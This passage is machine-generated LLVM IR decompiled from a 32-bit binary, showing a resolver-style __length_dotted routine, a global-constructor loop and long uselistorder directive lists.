  store i32 %v0_8067e9a, i32* @esi, align 4
  store i32 %v0_8067e99, i32* @edi, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %v1_8067f04, { 1, 0 }
  uselistorder i32 %v1_8067efd, { 0, 2, 1 }
  uselistorder i32 %v0_8067eea, { 1, 0 }
  uselistorder i32 %v5_8067eac, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 37, 47, 48, 44, 45, 54, 55, 39, 40, 61, 3, 4, 15, 16, 17, 18, 19, 20, 21, 22, 23, 5, 6, 46, 0, 7, 24, 56, 49, 50, 62, 25, 26, 27, 43, 41, 42, 8, 9, 10, 11, 12, 13, 38, 51, 52, 53, 57, 58, 59, 28, 29, 30, 60, 14, 1, 2, 36, 31, 32, 33, 34, 35 }
  uselistorder i32* @edx, { 300, 301, 81, 105, 305, 303, 304, 306, 307, 308, 312, 313, 314, 315, 102, 103, 104, 108, 109, 110, 111, 112, 113, 114, 3, 21, 241, 82, 83, 84, 23, 22, 85, 86, 87, 88, 91, 92, 93, 94, 95, 96, 97, 89, 90, 372, 374, 375, 316, 376, 377, 378, 379, 380, 101, 98, 99, 424, 6, 425, 330, 317, 318, 319, 331, 333, 350, 351, 7, 309, 310, 311, 100, 115, 106, 427, 107, 116, 117, 118, 119, 120, 121, 426, 122, 123, 124, 65, 66, 67, 4, 24, 381, 382, 320, 321, 8, 322, 323, 324, 325, 383, 384, 385, 386, 387, 388, 441, 442, 443, 444, 9, 445, 446, 334, 335, 281, 423, 428, 0, 429, 447, 448, 491, 490, 282, 283, 284, 285, 286, 287, 288, 289, 125, 458, 461, 10, 462, 459, 11, 460, 457, 430, 12, 431, 480, 290, 126, 127, 352, 353, 355, 356, 357, 358, 13, 128, 132, 129, 130, 131, 336, 337, 338, 339, 340, 341, 342, 349, 343, 344, 345, 346, 347, 348, 68, 69, 70, 2, 302, 354, 359, 389, 360, 326, 327, 328, 329, 390, 391, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 20, 409, 410, 392, 411, 14, 412, 413, 415, 15, 416, 417, 418, 419, 420, 421, 71, 16, 414, 449, 17, 371, 197, 422, 1, 463, 369, 481, 482, 194, 368, 193, 133, 135, 134, 136, 141, 137, 138, 139, 140, 332, 266, 456, 25, 483, 267, 216, 217, 373, 464, 142, 484, 485, 489, 143, 144, 486, 487, 450, 451, 145, 465, 466, 467, 470, 471, 472, 72, 468, 469, 146, 433, 434, 436, 437, 440, 147, 148, 150, 151, 152, 153, 154, 155, 156, 73, 74, 432, 438, 439, 149, 435, 157, 473, 474, 475, 158, 159, 75, 76, 268, 26, 166, 167, 168, 77, 479, 488, 476, 478, 18, 477, 455, 452, 453, 454, 160, 161, 162, 163, 164, 165, 169, 170, 172, 173, 174, 176, 179, 180, 78, 79, 181, 177, 178, 171, 175, 182, 183, 184, 185, 186, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 19, 37, 192, 187, 190, 188, 189, 80, 191, 492, 493, 195, 196, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 38, 39, 40, 41, 42, 43, 45, 46, 44, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 214, 215, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 235, 239, 234, 237, 238, 5, 236, 294, 240, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 291, 292, 293, 295, 296, 297, 298, 299, 361, 362, 363, 364, 365, 366, 367, 370, 494 }
  uselistorder i32 (i8*)* @strlen, { 5, 19, 18, 8, 14, 13, 12, 11, 10, 3, 9, 7, 6, 17, 16, 4, 2, 1, 0, 15 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 46, { 2, 1, 4, 3, 0, 6, 5, 7 }
  uselistorder i8* null, { 6, 4, 8, 7, 10, 9, 11, 3, 13, 0, 1, 12, 14, 15, 5, 16, 19, 20, 22, 18, 17, 21, 23, 24, 25, 26, 27, 28, 29, 30, 2, 31 }
  uselistorder i32* @esi, {}
  uselistorder i32* @edi, { 471, 42, 472, 473, 474, 40, 475, 177, 45, 43, 178, 111, 112, 113, 114, 115, 116, 117, 476, 477, 3, 0, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 491, 492, 493, 494, 495, 149, 150, 151, 618, 44, 619, 41, 679, 604, 605, 606, 607, 623, 10, 624, 625, 626, 138, 139, 140, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 499, 500, 501, 506, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 542, 488, 11, 489, 490, 121, 118, 119, 120, 5, 4, 122, 123, 124, 125, 126, 127, 128, 129, 130, 134, 131, 132, 133, 135, 136, 137, 141, 142, 143, 144, 145, 146, 147, 148, 600, 601, 12, 13, 602, 603, 152, 153, 154, 155, 156, 192, 193, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 175, 174, 176, 179, 180, 181, 182, 692, 693, 697, 698, 183, 184, 185, 186, 187, 188, 189, 190, 191, 694, 14, 695, 696, 608, 609, 610, 611, 612, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 613, 614, 615, 616, 617, 194, 195, 196, 197, 382, 383, 384, 385, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 15, 638, 639, 640, 641, 642, 643, 644, 721, 722, 723, 16, 724, 725, 726, 727, 448, 728, 792, 793, 449, 17, 450, 451, 198, 199, 200, 201, 202, 203, 204, 205, 206, 582, 583, 584, 585, 586, 733, 743, 744, 745, 746, 747, 734, 735, 736, 737, 738, 739, 740, 741, 742, 699, 713, 714, 700, 701, 702, 703, 704, 705, 706, 707, 18, 708, 709, 710, 711, 712, 207, 208, 209, 210, 211, 212, 213, 214, 9, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 543, 544, 19, 545, 546, 547, 548, 549, 550, 551, 348, 349, 350, 351, 352, 226, 227, 21, 20, 228, 229, 230, 231, 232, 235, 233, 234, 528, 23, 529, 24, 530, 531, 22, 532, 533, 534, 535, 540, 541, 1, 536, 537, 538, 539, 425, 25, 426, 427, 26, 428, 429, 430, 80, 27, 82, 83, 81, 28, 84, 29, 85, 86, 87, 88, 89, 31, 2, 90, 91, 92, 93, 30, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 502, 503, 504, 505, 645, 646, 647, 32, 648, 649, 790, 791, 650, 651, 652, 507, 33, 508, 509, 510, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 511, 512, 513, 311, 312, 313, 653, 654, 655, 656, 657, 658, 659, 660, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 34, 675, 106, 107, 108, 661, 35, 662, 663, 676, 677, 678, 786, 787, 788, 789, 564, 565, 566, 567, 568, 569, 570, 327, 328, 329, 330, 331, 593, 594, 595, 596, 319, 320, 321, 322, 323, 571, 572, 573, 574, 575, 576, 577, 748, 749, 750, 452, 453, 454, 587, 588, 298, 299, 300, 275, 276, 277, 270, 271, 272, 301, 302, 303, 496, 497, 498, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 526, 527, 411, 412, 776, 777, 778, 246, 247, 248, 254, 255, 256, 783, 784, 785, 249, 250, 251, 620, 621, 622, 751, 779, 780, 781, 782, 288, 413, 414, 36, 252, 253, 752, 753, 37, 754, 755, 257, 258, 729, 730, 259, 260, 756, 757, 758, 715, 716, 717, 718, 719, 720, 261, 262, 6, 7, 263, 264, 265, 266, 267, 268, 269, 759, 760, 761, 273, 274, 278, 279, 280, 281, 282, 283, 284, 769, 770, 771, 8, 38, 772, 773, 39, 774, 775, 762, 763, 764, 765, 766, 767, 768, 285, 286, 287, 731, 732, 109, 110, 289, 290, 291, 292, 293, 294, 295, 589, 590, 591, 592, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 296, 297, 304, 305, 306, 308, 307, 309, 310, 314, 315, 316, 317, 318, 324, 325, 326, 332, 333, 334, 335, 336, 337, 338, 339, 340, 61, 62, 63, 64, 65, 66, 67, 68, 69, 341, 342, 343, 344, 345, 346, 347, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 578, 579, 580, 581, 597, 598, 599 }
  uselistorder label %dec_label_pc_8067f20, { 1, 0 }
  uselistorder label %dec_label_pc_8067f1d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8067f09, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8067f04, { 1, 0 }
  uselistorder label %dec_label_pc_8067ece, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8067f36 = icmp eq i32 %arg1, 0
  br i1 %v1_8067f36, label %dec_label_pc_8067f65, label %dec_label_pc_8067f56.preheader

dec_label_pc_8067f56.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_8067f5610 = add i32 %arg2, %arg1
  %v3_8067f5611 = inttoptr i32 %v2_8067f5610 to i8*
  %v4_8067f5612 = load i8, i8* %v3_8067f5611, align 1
  %v1_8067f5a14 = add i32 %arg2, 1
  %v1_8067f5d15 = icmp eq i8 %v4_8067f5612, 0
  %v1_8067f5f16 = icmp eq i1 %v1_8067f5d15, false
  br i1 %v1_8067f5f16, label %dec_label_pc_8067f45, label %dec_label_pc_8067f61

dec_label_pc_8067f3c:                             ; preds = %dec_label_pc_8067f45
  %v1_8067f3c = add i32 %v0_8067f3c17, 2
  br label %dec_label_pc_8067f61

dec_label_pc_8067f45:                             ; preds = %dec_label_pc_8067f56.preheader, %dec_label_pc_8067f56
  %v1_8067f5a19 = phi i32 [ %v1_8067f5a, %dec_label_pc_8067f56 ], [ %v1_8067f5a14, %dec_label_pc_8067f56.preheader ]
  %v5_8067f5618.in = phi i8 [ %v4_8067f56, %dec_label_pc_8067f56 ], [ %v4_8067f5612, %dec_label_pc_8067f56.preheader ]
  %v0_8067f3c17 = phi i32 [ %v2_8067f53, %dec_label_pc_8067f56 ], [ %arg2, %dec_label_pc_8067f56.preheader ]
  %v5_8067f5618 = zext i8 %v5_8067f5618.in to i32
  %v1_8067f47 = and i32 %v5_8067f5618, 192
  %v6_8067f4c = icmp eq i32 %v1_8067f47, 192
  %v2_8067f53 = add i32 %v5_8067f5618, %v1_8067f5a19
  br i1 %v6_8067f4c, label %dec_label_pc_8067f3c, label %dec_label_pc_8067f56

dec_label_pc_8067f56:                             ; preds = %dec_label_pc_8067f45
  store i32 %v2_8067f53, i32* @ecx, align 4
  %v2_8067f56 = add i32 %v2_8067f53, %arg1
  %v3_8067f56 = inttoptr i32 %v2_8067f56 to i8*
  %v4_8067f56 = load i8, i8* %v3_8067f56, align 1
  %v1_8067f5a = add i32 %v2_8067f53, 1
  %v1_8067f5d = icmp eq i8 %v4_8067f56, 0
  %v1_8067f5f = icmp eq i1 %v1_8067f5d, false
  br i1 %v1_8067f5f, label %dec_label_pc_8067f45, label %dec_label_pc_8067f61

dec_label_pc_8067f61:                             ; preds = %dec_label_pc_8067f56.preheader, %dec_label_pc_8067f56, %dec_label_pc_8067f3c
  %v0_8067f61 = phi i32 [ %v1_8067f3c, %dec_label_pc_8067f3c ], [ %v1_8067f5a14, %dec_label_pc_8067f56.preheader ], [ %v1_8067f5a, %dec_label_pc_8067f56 ]
  %v2_8067f63 = sub i32 %v0_8067f61, %arg2
  br label %dec_label_pc_8067f65

dec_label_pc_8067f65:                             ; preds = %entry, %dec_label_pc_8067f61
  %v0_8067f68 = phi i32 [ -1, %entry ], [ %v2_8067f63, %dec_label_pc_8067f61 ]
  ret i32 %v0_8067f68

; uselistorder directives
  uselistorder i8 %v4_8067f56, { 1, 0 }
  uselistorder i32 %v2_8067f53, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 2, { 363, 291, 395, 396, 177, 367, 368, 112, 113, 114, 0, 1, 364, 369, 370, 371, 295, 372, 373, 374, 375, 376, 377, 2, 3, 4, 128, 129, 404, 178, 179, 397, 130, 180, 48, 5, 122, 321, 322, 405, 406, 115, 398, 399, 415, 49, 50, 51, 138, 181, 182, 183, 131, 6, 169, 378, 379, 380, 381, 116, 52, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 273, 19, 20, 21, 400, 292, 401, 132, 402, 306, 307, 170, 184, 185, 274, 403, 139, 308, 186, 53, 133, 407, 408, 171, 54, 55, 140, 141, 382, 187, 188, 189, 190, 191, 192, 193, 418, 134, 293, 46, 194, 275, 195, 276, 196, 277, 419, 123, 56, 358, 119, 197, 198, 22, 199, 23, 200, 24, 201, 202, 57, 58, 142, 59, 60, 143, 416, 61, 62, 172, 63, 203, 323, 324, 121, 325, 25, 326, 327, 27, 26, 28, 385, 386, 387, 388, 29, 144, 296, 389, 390, 328, 30, 329, 330, 124, 383, 384, 31, 204, 135, 354, 145, 309, 310, 64, 311, 32, 312, 34, 313, 65, 35, 33, 66, 314, 36, 205, 315, 316, 146, 317, 318, 319, 67, 320, 68, 336, 337, 365, 366, 332, 333, 125, 126, 127, 69, 420, 147, 37, 38, 409, 410, 136, 70, 71, 411, 72, 412, 73, 148, 413, 414, 74, 391, 393, 206, 173, 297, 417, 39, 40, 41, 42, 43, 174, 207, 278, 351, 137, 75, 208, 209, 76, 44, 301, 294, 47, 210, 279, 211, 280, 212, 214, 213, 281, 331, 77, 216, 78, 215, 79, 80, 218, 217, 81, 82, 83, 84, 149, 302, 303, 304, 305, 219, 220, 334, 221, 120, 335, 222, 175, 338, 223, 85, 176, 339, 224, 86, 225, 226, 150, 87, 88, 89, 90, 91, 92, 93, 94, 95, 227, 282, 228, 342, 151, 340, 96, 341, 343, 229, 230, 231, 232, 233, 234, 237, 97, 235, 98, 236, 298, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 239, 344, 238, 240, 283, 152, 242, 153, 241, 284, 154, 243, 155, 244, 345, 346, 156, 245, 157, 246, 347, 348, 299, 247, 285, 158, 248, 286, 249, 349, 350, 159, 250, 287, 160, 251, 288, 352, 353, 252, 253, 161, 254, 162, 255, 355, 163, 300, 256, 164, 257, 289, 258, 165, 259, 166, 260, 356, 357, 167, 261, 359, 360, 361, 45, 168, 262, 263, 362, 110, 265, 111, 264, 117, 392, 267, 266, 290, 118, 394, 268, 269, 270, 271, 272 }
  uselistorder i8 0, { 50, 5, 276, 277, 121, 109, 7, 284, 279, 280, 6, 282, 283, 281, 37, 285, 2, 3, 122, 9, 226, 225, 8, 51, 286, 287, 288, 334, 335, 390, 12, 294, 290, 291, 289, 10, 292, 293, 11, 38, 295, 296, 299, 300, 301, 302, 307, 15, 16, 52, 14, 13, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 53, 333, 83, 81, 82, 123, 124, 18, 228, 227, 17, 229, 230, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 4, 352, 353, 354, 408, 355, 427, 54, 74, 47, 49, 255, 19, 425, 412, 413, 391, 392, 393, 394, 395, 396, 55, 397, 309, 310, 125, 126, 127, 303, 304, 41, 306, 20, 247, 248, 249, 250, 251, 84, 85, 86, 87, 88, 89, 90, 91, 22, 92, 93, 95, 94, 39, 96, 97, 98, 99, 21, 100, 24, 197, 198, 23, 278, 356, 357, 75, 35, 34, 0, 56, 57, 58, 358, 308, 181, 311, 305, 312, 297, 298, 313, 314, 315, 359, 360, 361, 362, 363, 364, 365, 366, 367, 25, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 36, 381, 382, 383, 384, 385, 386, 387, 388, 101, 409, 316, 317, 318, 330, 389, 319, 320, 128, 426, 129, 130, 42, 131, 415, 416, 417, 418, 419, 421, 422, 423, 420, 398, 399, 400, 403, 401, 402, 26, 404, 405, 407, 132, 133, 134, 135, 136, 137, 138, 139, 140, 406, 43, 141, 424, 142, 143, 411, 414, 102, 103, 244, 144, 145, 410, 104, 105, 106, 107, 146, 147, 148, 149, 151, 150, 27, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 164, 163, 76, 77, 78, 79, 165, 44, 168, 166, 167, 169, 170, 171, 172, 173, 175, 174, 28, 176, 177, 178, 179, 180, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 40, 194, 195, 80, 45, 196, 199, 200, 201, 59, 202, 203, 204, 60, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 223, 222, 29, 219, 220, 31, 221, 30, 224, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 61, 242, 243, 245, 246, 252, 253, 254, 62, 63, 256, 257, 258, 259, 260, 261, 262, 263, 264, 1, 265, 266, 267, 268, 33, 269, 32, 270, 48, 271, 272, 273, 274, 275, 321, 322, 323, 324, 325, 326, 327, 328, 329, 331, 332, 46, 108, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73 }
  uselistorder i32* @ecx, { 35, 5, 128, 273, 15, 274, 275, 276, 277, 16, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 129, 334, 346, 123, 131, 132, 133, 134, 135, 6, 240, 1, 241, 110, 111, 112, 113, 115, 116, 117, 118, 119, 120, 114, 294, 17, 7, 348, 349, 350, 351, 336, 337, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 9, 20, 296, 297, 18, 8, 19, 298, 301, 302, 303, 304, 305, 11, 34, 10, 121, 122, 338, 339, 340, 141, 142, 12, 36, 335, 341, 37, 124, 125, 126, 127, 130, 425, 424, 136, 137, 138, 139, 423, 140, 342, 343, 344, 82, 83, 84, 21, 85, 86, 345, 13, 242, 2, 243, 352, 353, 41, 42, 43, 354, 299, 300, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 38, 380, 381, 382, 383, 39, 384, 33, 258, 455, 268, 259, 22, 260, 261, 262, 263, 264, 143, 329, 330, 144, 145, 146, 147, 148, 328, 331, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 23, 473, 459, 460, 452, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 24, 445, 446, 448, 449, 450, 451, 447, 493, 265, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 308, 309, 310, 311, 312, 313, 314, 316, 317, 318, 319, 320, 162, 25, 163, 170, 164, 165, 166, 167, 168, 169, 306, 307, 14, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 212, 0, 208, 209, 210, 207, 211, 44, 26, 315, 197, 45, 46, 321, 322, 385, 386, 387, 388, 389, 390, 391, 40, 392, 393, 394, 395, 396, 397, 27, 28, 3, 4, 398, 399, 29, 400, 401, 402, 403, 404, 406, 407, 408, 409, 101, 102, 405, 410, 456, 323, 199, 200, 484, 485, 494, 325, 295, 171, 173, 172, 174, 176, 175, 499, 486, 177, 178, 347, 457, 500, 501, 254, 255, 454, 495, 179, 332, 180, 487, 458, 453, 181, 103, 256, 502, 182, 183, 326, 104, 105, 106, 107, 266, 201, 327, 108, 491, 30, 492, 497, 498, 496, 488, 489, 490, 32, 31, 184, 185, 186, 187, 188, 189, 190, 65, 66, 191, 192, 109, 193, 194, 195, 196, 47, 198, 202, 203, 204, 205, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 206, 213, 214, 215, 216, 217, 218, 48, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 49, 238, 269, 50, 239, 244, 245, 246, 247, 248, 249, 250, 251, 51, 52, 53, 252, 54, 55, 253, 257, 56, 57, 58, 59, 60, 267, 61, 62, 270, 271, 272, 324, 63, 333, 64 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8067f65, { 1, 0 }
  uselistorder label %dec_label_pc_8067f61, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8067f45, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8067f7c = load i32, i32* @global_var_807062c.818, align 4
  %v10_8067f81 = icmp eq i32 %v0_8067f7c, -1
  br i1 %v10_8067f81, label %dec_label_pc_8067f9c, label %dec_label_pc_8067f90.preheader

dec_label_pc_8067f90.preheader:                   ; preds = %entry
  br label %dec_label_pc_8067f90

dec_label_pc_8067f90:                             ; preds = %dec_label_pc_8067f90.preheader, %dec_label_pc_8067f90
  %v4_8067f93 = phi i32 [ %v0_8067f7c, %dec_label_pc_8067f90.preheader ], [ %v2_8067f95, %dec_label_pc_8067f90 ]
  %v0_8067f90 = phi i32 [ ptrtoint (i32* @global_var_807062c.818 to i32), %dec_label_pc_8067f90.preheader ], [ %v1_8067f90, %dec_label_pc_8067f90 ]
  %v1_8067f90 = add i32 %v0_8067f90, -4
  call void @__pseudo_call(i32 %v4_8067f93)
  %v1_8067f95 = inttoptr i32 %v1_8067f90 to i32*
  %v2_8067f95 = load i32, i32* %v1_8067f95, align 4
  %v10_8067f97 = icmp eq i32 %v2_8067f95, -1
  %v1_8067f9a = icmp eq i1 %v10_8067f97, false
  br i1 %v1_8067f9a, label %dec_label_pc_8067f90, label %dec_label_pc_8067f9c.loopexit

dec_label_pc_8067f9c.loopexit:                    ; preds = %dec_label_pc_8067f90
  %v2_8067f9c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8067f9c

dec_label_pc_8067f9c:                             ; preds = %dec_label_pc_8067f9c.loopexit, %entry
  %v2_8067f9c = phi i32 [ %v2_8067f9c.pre, %dec_label_pc_8067f9c.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_8067f9c

; uselistorder directives
  uselistorder i32 %v0_8067f7c, { 1, 0 }
  uselistorder i1 false, { 1229, 1077, 10, 1079, 1078, 325, 389, 388, 1230, 1088, 76, 77, 1083, 1087, 1085, 1086, 106, 1080, 1081, 1084, 1089, 1090, 1095, 1096, 1097, 368, 369, 370, 11, 371, 372, 373, 374, 392, 1251, 1256, 1254, 1255, 1252, 107, 1253, 1372, 1373, 1231, 1232, 12, 1233, 1234, 375, 1240, 1241, 393, 394, 395, 396, 13, 851, 852, 853, 108, 327, 326, 110, 328, 329, 330, 331, 332, 334, 333, 109, 1098, 1099, 1100, 1242, 1101, 1102, 1103, 1257, 1258, 1259, 1104, 78, 1105, 1260, 1261, 1262, 353, 1374, 1375, 15, 336, 335, 14, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 345, 421, 422, 1111, 79, 16, 1106, 1107, 1108, 1109, 1110, 1119, 1120, 80, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 8, 9, 18, 1091, 1092, 1094, 1093, 17, 337, 338, 339, 340, 341, 342, 343, 344, 346, 347, 348, 349, 111, 350, 351, 352, 354, 358, 357, 359, 360, 355, 356, 1236, 1237, 1238, 1239, 361, 376, 377, 378, 379, 380, 404, 403, 19, 1235, 362, 363, 364, 365, 366, 367, 1243, 1244, 381, 382, 383, 384, 385, 386, 387, 390, 1388, 1385, 391, 397, 398, 400, 399, 112, 401, 1387, 1386, 113, 402, 405, 406, 1245, 407, 408, 409, 410, 1246, 245, 246, 247, 248, 250, 249, 114, 251, 252, 253, 254, 255, 256, 20, 81, 21, 257, 258, 260, 259, 261, 1247, 1248, 1249, 1250, 411, 414, 412, 413, 415, 416, 417, 418, 22, 854, 855, 856, 857, 1263, 1264, 1265, 1148, 1149, 1112, 1113, 1114, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 144, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1420, 1421, 100, 7, 1299, 115, 163, 1300, 1301, 1422, 1423, 1424, 1023, 419, 1407, 1419, 1496, 1497, 1498, 1499, 1503, 116, 1504, 1505, 1502, 1495, 1425, 204, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 164, 1032, 1033, 1034, 1035, 1036, 1037, 23, 1038, 1039, 101, 1214, 24, 1216, 1217, 420, 1431, 1432, 1435, 1436, 1480, 1481, 1482, 1447, 1448, 1449, 1450, 1451, 1452, 1441, 1442, 1443, 1444, 1445, 1446, 1440, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 74, 1400, 1399, 1404, 1401, 1402, 1403, 25, 1405, 1406, 1040, 1041, 489, 1483, 947, 423, 424, 425, 426, 26, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 1150, 1151, 1153, 1154, 1155, 1156, 1158, 1157, 438, 440, 441, 442, 443, 439, 444, 445, 448, 102, 446, 103, 447, 1133, 1134, 1140, 82, 1135, 1136, 1138, 1137, 1141, 1142, 1147, 1146, 1143, 1144, 1145, 27, 0, 965, 118, 970, 966, 70, 71, 72, 967, 968, 969, 117, 971, 972, 973, 974, 975, 976, 977, 978, 119, 267, 264, 262, 263, 122, 265, 266, 121, 268, 269, 270, 271, 272, 273, 274, 276, 275, 30, 277, 278, 279, 280, 282, 281, 29, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 28, 295, 296, 302, 297, 298, 299, 300, 301, 120, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 1500, 32, 717, 716, 31, 1082, 1302, 1303, 123, 694, 695, 696, 698, 697, 33, 699, 1304, 34, 1152, 608, 609, 1159, 1139, 1305, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1117, 1115, 1116, 35, 83, 1167, 1169, 1168, 124, 1170, 1172, 1171, 125, 1173, 1174, 1175, 1118, 569, 147, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1326, 1325, 1327, 1328, 1329, 1330, 1331, 1333, 75, 1334, 1332, 1335, 1337, 1336, 36, 1338, 1339, 1341, 1340, 126, 1342, 1343, 1344, 1345, 1346, 165, 1347, 1348, 173, 174, 1349, 175, 176, 1350, 1351, 177, 1352, 1353, 166, 178, 1354, 1355, 1356, 1357, 1358, 167, 1359, 168, 179, 169, 1360, 170, 1361, 1362, 1363, 171, 1364, 172, 1365, 180, 1366, 1367, 1368, 314, 315, 1369, 1370, 1426, 127, 1430, 37, 1176, 1177, 1178, 1179, 1180, 1181, 636, 128, 637, 638, 639, 640, 641, 642, 612, 1371, 1182, 449, 450, 451, 452, 453, 454, 455, 456, 457, 948, 104, 458, 459, 460, 461, 462, 1453, 1454, 1455, 463, 464, 1409, 1417, 1418, 1485, 465, 466, 467, 1427, 1428, 1429, 1475, 1479, 1486, 1220, 148, 149, 1221, 38, 468, 1456, 1457, 1460, 1461, 1462, 1463, 1464, 316, 1466, 1458, 1459, 1410, 1411, 1412, 39, 1415, 469, 40, 470, 471, 472, 475, 476, 1416, 1408, 129, 1413, 1414, 474, 473, 1, 477, 1467, 490, 1439, 2, 1465, 130, 1468, 478, 479, 480, 481, 317, 318, 319, 320, 949, 950, 959, 951, 952, 953, 954, 955, 958, 956, 131, 957, 482, 483, 1437, 1487, 502, 503, 504, 484, 150, 485, 486, 487, 152, 153, 1476, 1477, 132, 1478, 151, 1488, 41, 1489, 154, 1491, 1492, 1493, 155, 1494, 156, 1484, 1490, 1469, 42, 1474, 157, 1471, 1470, 43, 1472, 44, 158, 1473, 488, 1438, 491, 1433, 84, 1434, 321, 322, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 45, 505, 506, 507, 508, 511, 514, 515, 516, 512, 513, 510, 509, 1222, 1223, 133, 517, 134, 518, 205, 47, 206, 46, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 519, 525, 526, 3, 85, 524, 523, 4, 520, 521, 135, 522, 48, 323, 527, 73, 528, 529, 1501, 540, 530, 531, 532, 49, 533, 534, 535, 536, 537, 538, 539, 159, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 570, 574, 571, 572, 573, 50, 576, 575, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 